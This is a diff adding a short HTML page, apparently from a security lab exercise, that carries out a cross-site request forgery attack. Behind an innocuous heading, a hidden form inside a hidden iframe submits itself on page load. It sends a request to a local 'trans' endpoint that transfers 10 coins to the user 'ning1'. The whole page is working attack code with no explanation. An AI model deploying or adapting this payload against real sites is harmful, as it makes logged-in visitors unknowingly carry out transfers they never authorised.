@@ -1,0 +1,23 @@
+<HTML>
+	<HEAD>
+	</HEAD>
+	<BODY>
+	<h2>Nice weather isn't it?</h2>
+	<script type="text/javascript">
+	window.onload=function(){document.getElementById("click").click();};
+	var redir=false;
+	</script>
+
+	<iframe style="visibility:hidden" src='' name='attack_frame'>
+	</iframe>
+
+	<form style="visibility:hidden" method='GET' action='http://localhost:8081/trans' target="attack_frame">
+	    <input name='coins' type=hidden value="10">
+        <input name='receiver' type=hidden value="ning1">
+		<input id="click" type="submit" name="submission"  value="Send">
+	</form>
+
+	<!-- <a href='http://www.w3schools.com' target="attack_frame">refresh</a> -->
+	</BODY>
+</HTML>
+
